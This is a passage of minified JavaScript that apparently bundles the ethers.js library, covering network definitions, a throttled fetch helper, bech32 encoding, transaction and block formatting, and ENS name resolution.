61,name:"classic",_defaultProvider:Vg("https://www.ethercluster.com/etc","classic")},classicMorden:{chainId:62,name:"classicMorden"},classicMordor:P8,classicTestnet:P8,classicKotti:{chainId:6,name:"classicKotti",_defaultProvider:Vg("https://www.ethercluster.com/kotti","classicKotti")},xdai:{chainId:100,name:"xdai"},matic:{chainId:137,name:"matic",_defaultProvider:Ma("matic")},maticmum:{chainId:80001,name:"maticmum"},optimism:{chainId:10,name:"optimism",_defaultProvider:Ma("optimism")},"optimism-kovan":{chainId:69,name:"optimism-kovan"},"optimism-goerli":{chainId:420,name:"optimism-goerli"},arbitrum:{chainId:42161,name:"arbitrum"},"arbitrum-rinkeby":{chainId:421611,name:"arbitrum-rinkeby"},"arbitrum-goerli":{chainId:421613,name:"arbitrum-goerli"},bnb:{chainId:56,name:"bnb"},bnbt:{chainId:97,name:"bnbt"}};function bte(e){if(null==e)return null;if("number"==typeof e){for(const t in A1){const r=A1[t];if(r.chainId===e)return{name:r.name,chainId:r.chainId,ensAddress:r.ensAddress||null,_defaultProvider:r._defaultProvider||null}}return{chainId:e,name:"unknown"}}if("string"==typeof e){const t=A1[e];return null==t?null:{name:t.name,chainId:t.chainId,ensAddress:t.ensAddress,_defaultProvider:t._defaultProvider||null}}const t=A1[e.name];if(!t)return"number"!=typeof e.chainId&&T8.throwArgumentError("invalid network chainId","network",e),e;0!==e.chainId&&e.chainId!==t.chainId&&T8.throwArgumentError("network chainId mismatch","network",e);let r=e._defaultProvider||null;return null==r&&t._defaultProvider&&(r=mte(t._defaultProvider)?t._defaultProvider.renetwork(e):t._defaultProvider),{name:e.name,chainId:t.chainId,ensAddress:e.ensAddress||t.ensAddress||null,_defaultProvider:r}}const wte="web/5.7.1";var yte=globalThis&&globalThis.__awaiter||function(e,t,r,n){return new(r||(r=Promise))((function(i,o){function s(e){try{c(n.next(e))}catch(e){o(e)}}function a(e){try{c(n.throw(e))}catch(e){o(e)}}function c(e){e.done?i(e.value):function(e){return e instanceof r?e:new r((function(t){t(e)}))}(e.value).then(s,a)}c((n=n.apply(e,t||[])).next())}))};function _te(e,t){return yte(this,void 0,void 0,(function*(){null==t&&(t={});const r={method:t.method||"GET",headers:t.headers||{},body:t.body||void 0};if(!0!==t.skipFetchSetup&&(r.mode="cors",r.cache="no-cache",r.credentials="same-origin",r.redirect="follow",r.referrer="client"),null!=t.fetchOptions){const e=t.fetchOptions;e.mode&&(r.mode=e.mode),e.cache&&(r.cache=e.cache),e.credentials&&(r.credentials=e.credentials),e.redirect&&(r.redirect=e.redirect),e.referrer&&(r.referrer=e.referrer)}const n=yield fetch(e,r),i=yield n.arrayBuffer(),o={};return n.headers.forEach?n.headers.forEach(((e,t)=>{o[t.toLowerCase()]=e})):n.headers.keys().forEach((e=>{o[e.toLowerCase()]=n.headers.get(e)})),{headers:o,statusCode:n.status,statusMessage:n.statusText,body:Lt(new Uint8Array(i))}}))}var Ete=globalThis&&globalThis.__awaiter||function(e,t,r,n){return new(r||(r=Promise))((function(i,o){function s(e){try{c(n.next(e))}catch(e){o(e)}}function a(e){try{c(n.throw(e))}catch(e){o(e)}}function c(e){e.done?i(e.value):function(e){return e instanceof r?e:new r((function(t){t(e)}))}(e.value).then(s,a)}c((n=n.apply(e,t||[])).next())}))};const so=new we(wte);function M8(e){return new Promise((t=>{setTimeout(t,e)}))}function fc(e,t){if(null==e)return null;if("string"==typeof e)return e;if(l_(e)){if(t&&("text"===t.split("/")[0]||"application/json"===t.split(";")[0].trim()))try{return jv(e)}catch{}return kt(e)}return e}function xte(e){return ja(e.replace(/%([0-9a-f][0-9a-f])/gi,((e,t)=>String.fromCharCode(parseInt(t,16)))))}function Ste(e,t,r){const n="object"==typeof e&&null!=e.throttleLimit?e.throttleLimit:12;so.assertArgument(n>0&&n%1==0,"invalid connection throttle limit","connection.throttleLimit",n);const i="object"==typeof e?e.throttleCallback:null,o="object"==typeof e&&"number"==typeof e.throttleSlotInterval?e.throttleSlotInterval:100;so.assertArgument(o>0&&o%1==0,"invalid connection throttle slot interval","connection.throttleSlotInterval",o);const s="object"==typeof e&&!!e.errorPassThrough,a={};let c=null;const l={method:"GET"};let u=!1,h=12e4;if("string"==typeof e)c=e;else if("object"==typeof e){if((null==e||null==e.url)&&so.throwArgumentError("missing URL","connection.url",e),c=e.url,"number"==typeof e.timeout&&e.timeout>0&&(h=e.timeout),e.headers)for(const t in e.headers)a[t.toLowerCase()]={key:t,value:String(e.headers[t])},["if-none-match","if-modified-since"].indexOf(t.toLowerCase())>=0&&(u=!0);if(l.allowGzip=!!e.allowGzip,null!=e.user&&null!=e.password){"https:"!==c.substring(0,6)&&!0!==e.allowInsecureAuthentication&&so.throwError("basic authentication requires a secure https url",we.errors.INVALID_ARGUMENT,{argument:"url",url:c,user:e.user,password:"[REDACTED]"});const t=e.user+":"+e.password;a.authorization={key:"Authorization",value:"Basic "+i7(ja(t))}}null!=e.skipFetchSetup&&(l.skipFetchSetup=!!e.skipFetchSetup),null!=e.fetchOptions&&(l.fetchOptions=Wi(e.fetchOptions))}const d=new RegExp("^data:([^;:]*)?(;base64)?,(.*)$","i"),f=c?c.match(d):null;if(f)try{const e={statusCode:200,statusMessage:"OK",headers:{"content-type":f[1]||"text/plain"},body:f[2]?n7(f[3]):xte(f[3])};let t=e.body;return r&&(t=r(e.body,e)),Promise.resolve(t)}catch(e){so.throwError("processing response error",we.errors.SERVER_ERROR,{body:fc(f[1],f[2]),error:e,requestBody:null,requestMethod:"GET",url:c})}t&&(l.method="POST",l.body=t,null==a["content-type"]&&(a["content-type"]={key:"Content-Type",value:"application/octet-stream"}),null==a["content-length"]&&(a["content-length"]={key:"Content-Length",value:String(t.length)}));const p={};Object.keys(a).forEach((e=>{const t=a[e];p[t.key]=t.value})),l.headers=p;const g=function(){let e=null;return{promise:new Promise((function(t,r){h&&(e=setTimeout((()=>{null!=e&&(e=null,r(so.makeError("timeout",we.errors.TIMEOUT,{requestBody:fc(l.body,p["content-type"]),requestMethod:l.method,timeout:h,url:c})))}),h))})),cancel:function(){null!=e&&(clearTimeout(e),e=null)}}}(),m=function(){return Ete(this,void 0,void 0,(function*(){for(let e=0;e<n;e++){let t=null;try{if(t=yield _te(c,l),e<n)if(301===t.statusCode||302===t.statusCode){const e=t.headers.location||"";if("GET"===l.method&&e.match(/^https:/)){c=t.headers.location;continue}}else if(429===t.statusCode){let r=!0;if(i&&(r=yield i(e,c)),r){let r=0;const n=t.headers["retry-after"];r="string"==typeof n&&n.match(/^[1-9][0-9]*$/)?1e3*parseInt(n):o*parseInt(String(Math.random()*Math.pow(2,e))),yield M8(r);continue}}}catch(e){t=e.response,null==t&&(g.cancel(),so.throwError("missing response",we.errors.SERVER_ERROR,{requestBody:fc(l.body,p["content-type"]),requestMethod:l.method,serverError:e,url:c}))}let a=t.body;if(u&&304===t.statusCode?a=null:!s&&(t.statusCode<200||t.statusCode>=300)&&(g.cancel(),so.throwError("bad response",we.errors.SERVER_ERROR,{status:t.statusCode,headers:t.headers,body:fc(a,t.headers?t.headers["content-type"]:null),requestBody:fc(l.body,p["content-type"]),requestMethod:l.method,url:c})),r)try{const e=yield r(a,t);return g.cancel(),e}catch(r){if(r.throttleRetry&&e<n){let t=!0;if(i&&(t=yield i(e,c)),t){const t=o*parseInt(String(Math.random()*Math.pow(2,e)));yield M8(t);continue}}g.cancel(),so.throwError("processing response error",we.errors.SERVER_ERROR,{body:fc(a,t.headers?t.headers["content-type"]:null),error:r,requestBody:fc(l.body,p["content-type"]),requestMethod:l.method,url:c})}return g.cancel(),a}return so.throwError("failed response",we.errors.SERVER_ERROR,{requestBody:fc(l.body,p["content-type"]),requestMethod:l.method,url:c})}))}();return Promise.race([g.promise,m])}function y_(e,t,r){let n=null;if(null!=t){n=ja(t);const r="string"==typeof e?{url:e}:Wi(e);r.headers?0!==Object.keys(r.headers).filter((e=>"content-type"===e.toLowerCase())).length||(r.headers=Wi(r.headers),r.headers["content-type"]="application/json"):r.headers={"content-type":"application/json"},e=r}return Ste(e,n,((e,t)=>{let n=null;if(null!=e)try{n=JSON.parse(jv(e))}catch(t){so.throwError("invalid JSON",we.errors.SERVER_ERROR,{body:e,error:t})}return r&&(n=r(n,t)),n}))}function xd(e,t){return t||(t={}),null==(t=Wi(t)).floor&&(t.floor=0),null==t.ceiling&&(t.ceiling=1e4),null==t.interval&&(t.interval=250),new Promise((function(r,n){let i=null,o=!1;const s=()=>!o&&(o=!0,i&&clearTimeout(i),!0);t.timeout&&(i=setTimeout((()=>{s()&&n(new Error("timeout"))}),t.timeout));const a=t.retryLimit;let c=0;!function i(){return e().then((function(e){if(void 0!==e)s()&&r(e);else if(t.oncePoll)t.oncePoll.once("poll",i);else if(t.onceBlock)t.onceBlock.once("block",i);else if(!o){if(c++,c>a)return void(s()&&n(new Error("retry limit reached")));let e=t.interval*parseInt(String(Math.random()*Math.pow(2,c)));e<t.floor&&(e=t.floor),e>t.ceiling&&(e=t.ceiling),setTimeout(i,e)}return null}),(function(e){s()&&n(e)}))}()}))}for(var Gg="qpzry9x8gf2tvdw0s3jn54khce6mua7l",U2={},I1=0;I1<Gg.length;I1++){var ty=Gg.charAt(I1);if(void 0!==U2[ty])throw new TypeError(ty+" is ambiguous");U2[ty]=I1}function hf(e){var t=e>>25;return(33554431&e)<<5^996825010&-(t>>0&1)^642813549&-(t>>1&1)^513874426&-(t>>2&1)^1027748829&-(t>>3&1)^705979059&-(t>>4&1)}function U7(e){for(var t=1,r=0;r<e.length;++r){var n=e.charCodeAt(r);if(n<33||n>126)return"Invalid prefix ("+e+")";t=hf(t)^n>>5}for(t=hf(t),r=0;r<e.length;++r){var i=e.charCodeAt(r);t=hf(t)^31&i}return t}function Cte(e,t,r){if(r=r||90,e.length+7+t.length>r)throw new TypeError("Exceeds length limit");var n=U7(e=e.toLowerCase());if("string"==typeof n)throw new Error(n);for(var i=e+"1",o=0;o<t.length;++o){var s=t[o];if(s>>5)throw new Error("Non 5-bit word");n=hf(n)^s,i+=Gg.charAt(s)}for(o=0;o<6;++o)n=hf(n);for(n^=1,o=0;o<6;++o){var a=n>>5*(5-o)&31;i+=Gg.charAt(a)}return i}function W7(e,t){if(t=t||90,e.length<8)return e+" too short";if(e.length>t)return"Exceeds length limit";var r=e.toLowerCase(),n=e.toUpperCase();if(e!==r&&e!==n)return"Mixed-case string "+e;var i=(e=r).lastIndexOf("1");if(-1===i)return"No separator character for "+e;if(0===i)return"Missing prefix for "+e;var o=e.slice(0,i),s=e.slice(i+1);if(s.length<6)return"Data too short";var a=U7(o);if("string"==typeof a)return a;for(var c=[],l=0;l<s.length;++l){var u=s.charAt(l),h=U2[u];if(void 0===h)return"Unknown character "+u;a=hf(a)^h,!(l+6>=s.length)&&c.push(h)}return 1!==a?"Invalid checksum for "+e:{prefix:o,words:c}}function Ate(){var e=W7.apply(null,arguments);if("object"==typeof e)return e}function Ite(e){var t=W7.apply(null,arguments);if("object"==typeof t)return t;throw new Error(t)}function qv(e,t,r,n){for(var i=0,o=0,s=(1<<r)-1,a=[],c=0;c<e.length;++c)for(i=i<<t|e[c],o+=t;o>=r;)o-=r,a.push(i>>o&s);if(n)o>0&&a.push(i<<r-o&s);else{if(o>=t)return"Excess padding";if(i<<r-o&s)return"Non-zero padding"}return a}function Rte(e){var t=qv(e,8,5,!0);if(Array.isArray(t))return t}function Tte(e){var t=qv(e,8,5,!0);if(Array.isArray(t))return t;throw new Error(t)}function Nte(e){var t=qv(e,5,8,!1);if(Array.isArray(t))return t}function Ote(e){var t=qv(e,5,8,!1);if(Array.isArray(t))return t;throw new Error(t)}var Pte={decodeUnsafe:Ate,decode:Ite,encode:Cte,toWordsUnsafe:Rte,toWords:Tte,fromWordsUnsafe:Nte,fromWords:Ote};const k8=tu(Pte),Zc="providers/5.7.2",cd=new we(Zc);class Ye{constructor(){this.formats=this.getDefaultFormats()}getDefaultFormats(){const e={},t=this.address.bind(this),r=this.bigNumber.bind(this),n=this.blockTag.bind(this),i=this.data.bind(this),o=this.hash.bind(this),s=this.hex.bind(this),a=this.number.bind(this),c=this.type.bind(this);return e.transaction={hash:o,type:c,accessList:Ye.allowNull(this.accessList.bind(this),null),blockHash:Ye.allowNull(o,null),blockNumber:Ye.allowNull(a,null),transactionIndex:Ye.allowNull(a,null),confirmations:Ye.allowNull(a,null),from:t,gasPrice:Ye.allowNull(r),maxPriorityFeePerGas:Ye.allowNull(r),maxFeePerGas:Ye.allowNull(r),gasLimit:r,to:Ye.allowNull(t,null),value:r,nonce:a,data:i,r:Ye.allowNull(this.uint256),s:Ye.allowNull(this.uint256),v:Ye.allowNull(a),creates:Ye.allowNull(t,null),raw:Ye.allowNull(i)},e.transactionRequest={from:Ye.allowNull(t),nonce:Ye.allowNull(a),gasLimit:Ye.allowNull(r),gasPrice:Ye.allowNull(r),maxPriorityFeePerGas:Ye.allowNull(r),maxFeePerGas:Ye.allowNull(r),to:Ye.allowNull(t),value:Ye.allowNull(r),data:Ye.allowNull((e=>this.data(e,!0))),type:Ye.allowNull(a),accessList:Ye.allowNull(this.accessList.bind(this),null)},e.receiptLog={transactionIndex:a,blockNumber:a,transactionHash:o,address:t,topics:Ye.arrayOf(o),data:i,logIndex:a,blockHash:o},e.receipt={to:Ye.allowNull(this.address,null),from:Ye.allowNull(this.address,null),contractAddress:Ye.allowNull(t,null),transactionIndex:a,root:Ye.allowNull(s),gasUsed:r,logsBloom:Ye.allowNull(i),blockHash:o,transactionHash:o,logs:Ye.arrayOf(this.receiptLog.bind(this)),blockNumber:a,confirmations:Ye.allowNull(a,null),cumulativeGasUsed:r,effectiveGasPrice:Ye.allowNull(r),status:Ye.allowNull(a),type:c},e.block={hash:Ye.allowNull(o),parentHash:o,number:a,timestamp:a,nonce:Ye.allowNull(s),difficulty:this.difficulty.bind(this),gasLimit:r,gasUsed:r,miner:Ye.allowNull(t),extraData:i,transactions:Ye.allowNull(Ye.arrayOf(o)),baseFeePerGas:Ye.allowNull(r)},e.blockWithTransactions=Wi(e.block),e.blockWithTransactions.transactions=Ye.allowNull(Ye.arrayOf(this.transactionResponse.bind(this))),e.filter={fromBlock:Ye.allowNull(n,void 0),toBlock:Ye.allowNull(n,void 0),blockHash:Ye.allowNull(o,void 0),address:Ye.allowNull(t,void 0),topics:Ye.allowNull(this.topics.bind(this),void 0)},e.filterLog={blockNumber:Ye.allowNull(a),blockHash:Ye.allowNull(o),transactionIndex:a,removed:Ye.allowNull(this.boolean.bind(this)),address:t,data:Ye.allowFalsish(i,"0x"),topics:Ye.arrayOf(o),transactionHash:o,logIndex:a},e}accessList(e){return U0(e||[])}number(e){return"0x"===e?0:Ke.from(e).toNumber()}type(e){return"0x"===e||null==e?0:Ke.from(e).toNumber()}bigNumber(e){return Ke.from(e)}boolean(e){if("boolean"==typeof e)return e;if("string"==typeof e){if("true"===(e=e.toLowerCase()))return!0;if("false"===e)return!1}throw new Error("invalid boolean - "+e)}hex(e,t){return"string"==typeof e&&(!t&&"0x"!==e.substring(0,2)&&(e="0x"+e),Nr(e))?e.toLowerCase():cd.throwArgumentError("invalid hash","value",e)}data(e,t){const r=this.hex(e,t);if(r.length%2!=0)throw new Error("invalid data; odd-length - "+e);return r}address(e){return bo(e)}callAddress(e){if(!Nr(e,32))return null;const t=bo(mi(e,12));return t===NY?null:t}contractAddress(e){return TY(e)}blockTag(e){if(null==e)return"latest";if("earliest"===e)return"0x0";switch(e){case"earliest":return"0x0";case"latest":case"pending":case"safe":case"finalized":return e}if("number"==typeof e||Nr(e))return u_(e);throw new Error("invalid blockTag")}hash(e,t){const r=this.hex(e,t);return 32!==Vl(r)?cd.throwArgumentError("invalid hash","value",e):r}difficulty(e){if(null==e)return null;const t=Ke.from(e);try{return t.toNumber()}catch{}return null}uint256(e){if(!Nr(e))throw new Error("invalid uint256");return Jr(e,32)}_block(e,t){null!=e.author&&null==e.miner&&(e.miner=e.author);const r=null!=e._difficulty?e._difficulty:e.difficulty,n=Ye.check(t,e);return n._difficulty=null==r?null:Ke.from(r),n}block(e){return this._block(e,this.formats.block)}blockWithTransactions(e){return this._block(e,this.formats.blockWithTransactions)}transactionRequest(e){return Ye.check(this.formats.transactionRequest,e)}transactionResponse(e){null!=e.gas&&null==e.gasLimit&&(e.gasLimit=e.gas),e.to&&Ke.from(e.to).isZero()&&(e.to="0x0000000000000000000000000000000000000000"),null!=e.input&&null==e.data&&(e.data=e.input),null==e.to&&null==e.creates&&(e.creates=this.contractAddress(e)),(1===e.type||2===e.type)&&null==e.accessList&&(e.accessList=[]);const t=Ye.check(this.formats.transaction,e);if(null!=e.chainId){let r=e.chainId;Nr(r)&&(r=Ke.from(r).toNumber()),t.chainId=r}else{let r=e.networkId;null==r&&null==t.v&&(r=e.chainId),Nr(r)&&(r=Ke.from(r).toNumber()),"number"!=typeof r&&null!=t.v&&(r=(t.v-35)/2,r<0&&(r=0),r=parseInt(r)),"number"!=typeof r&&(r=0),t.chainId=r}return t.blockHash&&"x"===t.blockHash.replace(/0/g,"")&&(t.blockHash=null),t}transaction(e){return gte(e)}receiptLog(e){return Ye.check(this.formats.receiptLog,e)}receipt(e){const t=Ye.check(this.formats.receipt,e);if(null!=t.root)if(t.root.length<=4){const e=Ke.from(t.root).toNumber();0===e||1===e?(null!=t.status&&t.status!==e&&cd.throwArgumentError("alt-root-status/status mismatch","value",{root:t.root,status:t.status}),t.status=e,delete t.root):cd.throwArgumentError("invalid alt-root-status","value.root",t.root)}else 66!==t.root.length&&cd.throwArgumentError("invalid root hash","value.root",t.root);return null!=t.status&&(t.byzantium=!0),t}topics(e){return Array.isArray(e)?e.map((e=>this.topics(e))):null!=e?this.hash(e,!0):null}filter(e){return Ye.check(this.formats.filter,e)}filterLog(e){return Ye.check(this.formats.filterLog,e)}static check(e,t){const r={};for(const n in e)try{const i=e[n](t[n]);void 0!==i&&(r[n]=i)}catch(e){throw e.checkKey=n,e.checkValue=t[n],e}return r}static allowNull(e,t){return function(r){return null==r?t:e(r)}}static allowFalsish(e,t){return function(r){return r?e(r):t}}static arrayOf(e){return function(t){if(!Array.isArray(t))throw new Error("not an array");const r=[];return t.forEach((function(t){r.push(e(t))})),r}}}let D8=!1;function Mte(){D8||(D8=!0,console.log("========= NOTICE ========="),console.log("Request-Rate Exceeded  (this message will not be repeated)"),console.log(""),console.log("The default API keys for each service are provided as a highly-throttled,"),console.log("community resource for low-traffic projects and early prototyping."),console.log(""),console.log("While your application will continue to function, we highly recommended"),console.log("signing up for your own API keys to improve performance, increase your"),console.log("request rate/limit and enable other perks, such as metrics and advanced APIs."),console.log(""),console.log("For more details: https://docs.ethers.io/api-keys/"),console.log("=========================="))}var At=globalThis&&globalThis.__awaiter||function(e,t,r,n){return new(r||(r=Promise))((function(i,o){function s(e){try{c(n.next(e))}catch(e){o(e)}}function a(e){try{c(n.throw(e))}catch(e){o(e)}}function c(e){e.done?i(e.value):function(e){return e instanceof r?e:new r((function(t){t(e)}))}(e.value).then(s,a)}c((n=n.apply(e,t||[])).next())}))};const Ht=new we(Zc),kte=10;function $8(e){return null==e?"null":(32!==Vl(e)&&Ht.throwArgumentError("invalid topic","topic",e),e.toLowerCase())}function L8(e){for(e=e.slice();e.length>0&&null==e[e.length-1];)e.pop();return e.map((e=>{if(Array.isArray(e)){const t={};e.forEach((e=>{t[$8(e)]=!0}));const r=Object.keys(t);return r.sort(),r.join("|")}return $8(e)})).join("&")}function Dte(e){return""===e?[]:e.split(/&/g).map((e=>{if(""===e)return[];const t=e.split("|").map((e=>"null"===e?null:e));return 1===t.length?t[0]:t}))}function Uu(e){if("string"==typeof e){if(32===Vl(e=e.toLowerCase()))return"tx:"+e;if(-1===e.indexOf(":"))return e}else{if(Array.isArray(e))return"filter:*:"+L8(e);if(wX.isForkEvent(e))throw Ht.warn("not implemented"),new Error("not implemented");if(e&&"object"==typeof e)return"filter:"+(e.address||"*")+":"+L8(e.topics||[])}throw new Error("invalid event - "+e)}function ld(){return(new Date).getTime()}function B8(e){return new Promise((t=>{setTimeout(t,e)}))}const $te=["block","network","pending","poll"];let Lte=class{constructor(e,t,r){_t(this,"tag",e),_t(this,"listener",t),_t(this,"once",r),this._lastBlockNumber=-2,this._inflight=!1}get event(){switch(this.type){case"tx":return this.hash;case"filter":return this.filter}return this.tag}get type(){return this.tag.split(":")[0]}get hash(){const e=this.tag.split(":");return"tx"!==e[0]?null:e[1]}get filter(){const e=this.tag.split(":");if("filter"!==e[0])return null;const t=e[1],r=Dte(e[2]),n={};return r.length>0&&(n.topics=r),t&&"*"!==t&&(n.address=t),n}pollable(){return this.tag.indexOf(":")>=0||$te.indexOf(this.tag)>=0}};const Bte={0:{symbol:"btc",p2pkh:0,p2sh:5,prefix:"bc"},2:{symbol:"ltc",p2pkh:48,p2sh:50,prefix:"ltc"},3:{symbol:"doge",p2pkh:30,p2sh:22},60:{symbol:"eth",ilk:"eth"},61:{symbol:"etc",ilk:"eth"},700:{symbol:"xdai",ilk:"eth"}};function ry(e){return Jr(Ke.from(e).toHexString(),32)}function F8(e){return j2.encode(Pl([e,mi(R8(R8(e)),0,4)]))}const z7=new RegExp("^(ipfs)://(.*)$","i"),j8=[new RegExp("^(https)://(.*)$","i"),new RegExp("^(data):(.*)$","i"),z7,new RegExp("^eip155:[0-9]+/(erc[0-9]+):(.*)$","i")];function ig(e,t){try{return jv(h0(e,t))}catch{}return null}function h0(e,t){if("0x"===e)return null;const r=Ke.from(mi(e,t,t+32)).toNumber(),n=Ke.from(mi(e,r,r+32)).toNumber();return mi(e,r+32,r+32+n)}function ny(e){return e.match(/^ipfs:\/\/ipfs\//i)?e=e.substring(12):e.match(/^ipfs:\/\//i)?e=e.substring(7):Ht.throwArgumentError("unsupported IPFS format","link",e),`https://gateway.ipfs.io/ipfs/${e}`}function U8(e){const t=Lt(e);if(t.length>32)throw new Error("internal; should not happen");const r=new Uint8Array(32);return r.set(t,32-t.length),r}function Fte(e){if(e.length%32==0)return e;const t=new Uint8Array(32*Math.ceil(e.length/32));return t.set(e),t}function H7(e){const t=[];let r=0;for(let n=0;n<e.length;n++)t.push(null),r+=32;for(let n=0;n<e.length;n++){const i=Lt(e[n]);t[n]=U8(r),t.push(U8(i.length)),t.push(Fte(i)),r+=32+32*Math.ceil(i.length/32)}return ss(t)}class W8{constructor(e,t,r,n){_t(this,"provider",e),_t(this,"name",r),_t(this,"address",e.formatter.address(t)),_t(this,"_resolvedAddress",n)}supportsWildcard(){return this._supportsEip2544||(this._supportsEip2544=this.provider.call({to:this.address,data:"0x01ffc9a79061b92300000000000000000000000000000000000000000000000000000000"}).then((e=>Ke.from(e).eq(1))).catch((e=>{if(e.code===we.errors.CALL_EXCEPTION)return!1;throw this._supportsEip2544=null,e}))),this._supportsEip2544}_fetch(e,t){return At(this,void 0,void 0,(function*(){const r={to:this.address,ccipReadEnabled:!0,data:ss([e,tg(this.name),t||"0x"])};let n=!1;(yield this.supportsWildcard())&&(n=!0,r.data=ss(["0x9061b923",H7([cX(this.name),r.data])]));try{let e=yield this.provider.call(r);return Lt(e).length%32==4&&Ht.throwError("resolver threw error",we.errors.CALL_EXCEPTION,{transaction:r,data:e}),n&&(e=h0(e,0)),e}catch(e){if(e.code===we.errors.CALL_EXCEPTION)return null;throw e}}))}_fetchBytes(e,t){return At(this,void 0,void 0,(function*(){const r=yield this._fetch(e,t);return null!=r?h0(r,0):null}))}_getAddress(e,t){const r=Bte[String(e)];if(null==r&&Ht.throwError(`unsupported coin type: ${e}`,we.errors.UNSUPPORTED_OPERATION,{operation:`getAddress(${e})`}),"eth"===r.ilk)return this.provider.formatter.address(t);const n=Lt(t);if(null!=r.p2pkh){const e=t.match(/^0x76a9([0-9a-f][0-9a-f])([0-9a-f]*)88ac$/);if(e){const t=parseInt(e[1],16);if(e[2].length===2*t&&t>=1&&t<=75)return F8(Pl([[r.p2pkh],"0x"+e[2]]))}}if(null!=r.p2sh){const e=t.match(/^0xa9([0-9a-f][0-9a-f])([0-9a-f]*)87$/);if(e){const t=parseInt(e[1],16);if(e[2].length===2*t&&t>=1&&t<=75)return F8(Pl([[r.p2sh],"0x"+e[2]]))}}if(null!=r.prefix){const e=n[1];let t=n[0];if(0===t?20!==e&&32!==e&&(t=-1):t=-1,t>=0&&n.length===2+e&&e>=1&&e<=75){const e=k8.toWords(n.slice(2));return e.unshift(t),k8.encode(r.prefix,e)}}return null}getAddress(e){return At(this,void 0,void 0,(function*(){if(null==e&&(e=60),60===e)try{const e=yield this._fetch("0x3b3b57de");return"0x"===e||e===PY?null:this.provider.formatter.callAddress(e)}catch(e){if(e.code===we.errors.CALL_EXCEPTION)return null;throw e}const t=yield this._fetchBytes("0xf1cb7e06",ry(e));if(null==t||"0x"===t)return null;const r=this._getAddress(e,t);return null==r&&Ht.throwError("invalid or unsupported coin data",we.errors.UNSUPPORTED_OPERATION,{operation:`getAddress(${e})`,coinType:e,data:t}),r}))}getAvatar(){return At(this,void 0,void 0,(function*(){const e=[{type:"name",content:this.name}];try{const t=yield this.getText("avatar");if(null==t)return null;for(let r=0;r<j8.length;r++){const n=t.match(j8[r]);if(null==n)continue;const i=n[1].toLowerCase();switch(i){case"https":return e.push({type:"url",content:t}),{linkage:e,url:t};case"data":return e.push({type:"data",content:t}),{linkage:e,url:t};case"ipfs":return e.push({type:"ipfs",content:t}),{linkage:e,url:ny(t)};case"erc721":case"erc1155":{const r="erc721"===i?"0xc87b56dd":"0x0e89341c";e.push({type:i,content:t});const o=this._resolvedAddress||(yield this.getAddress()),s=(n[2]||"").split("/");if(2!==s.length)return null;const a=yield this.provider.formatter.address(s[0]),c=Jr(Ke.from(s[1]).toHexString(),32);if("erc721"===i){const t=this.provider.formatter.callAddress(yield this.provider.call({to:a,data:ss(["0x6352211e",c])}));if(o!==t)return null;e.push({type:"owner",content:t})}else if("erc1155"===i){const t=Ke.from(yield this.provider.call({to:a,data:ss(["0x00fdd58e",Jr(o,32),c])}));if(t.isZero())return null;e.push({type:"balance",content:t.toString()})}const l={to:this.provider.formatter.address(s[0]),data:ss([r,c])};let u=ig(yield this.provider.call(l),0);if(null==u)return null;e.push({type:"metadata-url-base",content:u}),"erc1155"===i&&(u=u.replace("{id}",c.substring(2)),e.push({type:"metadata-url-expanded",content:u})),u.match(/^ipfs:/i)&&(u=ny(u)),e.push({type:"metadata-url",content:u});const h=yield y_(u);if(!h)return null;e.push({type:"metadata",content:JSON.stringify(h)});let d=h.image;if("string"!=typeof d)return null;if(!d.match(/^(https:\/\/|data:)/i)){if(null==d.match(z7))return null;e.push({type:"url-ipfs",content:d}),d=ny(d)}return e.push({type:"url",content:d}),{linkage:e,url:d}}}}}catch{}return null}))}getContentHash(){return At(this,void 0,void 0,(function*(){const e=yield this._fetchBytes("0xbc1c58d1");if(null==e||"0x"===e)return null;const t=e.match(/^0xe3010170(([0-9a-f][0-9a-f])([0-9a-f][0-9a-f])([0-9a-f]*))$/);if(t){const e=parseInt(t[3],16);if(t[4].length===2*e)return"ipfs://"+j2.encode("0x"+t[1])}const r=e.match(/^0xe5010172(([0-9a-f][0-9a-f])([0-9a-f][0-9a-f])([0-9a-f]*))$/);if(r){const e=parseInt(r[3],16);if(r[4].length===2*e)return"ipns://"+j2.encode("0x"+r[1])}const n=e.match(/^0xe40101fa011b20([0-9a-f]*)$/);if(n&&64===n[1].length)return"bzz://"+n[1];const i=e.match(/^0x90b2c605([0-9a-f]*)$/);if(i&&68===i[1].length){const e={"=":"","+":"-","/":"_"};return"sia://"+i7("0x"+i[1]).replace(/[=+\/]/g,(t=>e[t]))}return Ht.throwError("invalid or unsupported content hash data",we.errors.UNSUPPORTED_OPERATION,{operation:"getContentHash()",data:e})}))}getText(e){return At(this,void 0,void 0,(function*(){let t=ja(e);t=Pl([ry(64),ry(t.length),t]),t.length%32!=0&&(t=Pl([t,Jr("0x",32-e.length%32)]));const r=yield this._fetchBytes("0x59d1d43c",kt(t));return null==r||"0x"===r?null:jv(r)}))}}let iy=null,jte=1;class Ute extends p_{constructor(e){if(super(),this._events=[],this._emitted={block:-2},this.disableCcipRead=!1,this.formatter=new.target.getFormatter(),_t(this,"anyNetwork","any"===e),this.anyNetwork&&(e=this.detectNetwork()),e instanceof Promise)this._networkPromise=e,e.catch((e=>{})),this._ready().catch((e=>{}));else{const t=Ec(new.target,"getNetwork")(e);t?(_t(this,"_network",t),this.emit("network",t,null)):Ht.throwArgumentError("invalid network","network",e)}this._maxInternalBlockNumber=-1024,this._lastBlockNumber=-2,this._maxFilterBlockRange=10,this._pollingInterval=4e3,this._fastQueryDate=0}_ready(){return At(this,void 0,void 0,(function*(){if(null==this._network){let e=null;if(this._networkPromise)try{e=yield this._networkPromise}catch{}null==e&&(e=yield this.detectNetwork()),e||Ht.throwError("no network detected",we.errors.UNKNOWN_ERROR,{}),null==this._network&&(this.anyNetwork?this._network=e:_t(this,"_network",e),this.emit("network",e,null))}return this._network}))}get ready(){return xd((()=>this._ready().then((e=>e),(e=>{if(e.code!==we.errors.NETWORK_ERROR||"noNetwork"!==e.event)throw e}))))}static getFormatter(){return null==iy&&(iy=new Ye),iy}static getNetwork(e){return bte(e??"homestead")}ccipReadFetch(e,t,r){return At(this,void 0,void 0,(function*(){if(this.disableCcipRead||0===r.length)return null;const n=e.to.toLowerCase(),i=t.toLowerCase(),o=[];for(let e=0;e<r.length;e++){const t=r[e],s=t.replace("{sender}",n).replace("{data}",i),a=t.indexOf("{data}")>=0?null:JSON.stringify({data:i,sender:n}),c=yield y_({url:s,errorPassThrough:!0},a,((e,t)=>(e.status=t.statusCode,e)));if(c.data)return c.data;const l=c.message||"unknown error";if(c.status>=400&&c.status<500)return Ht.throwError(`response not found during CCIP fetch: 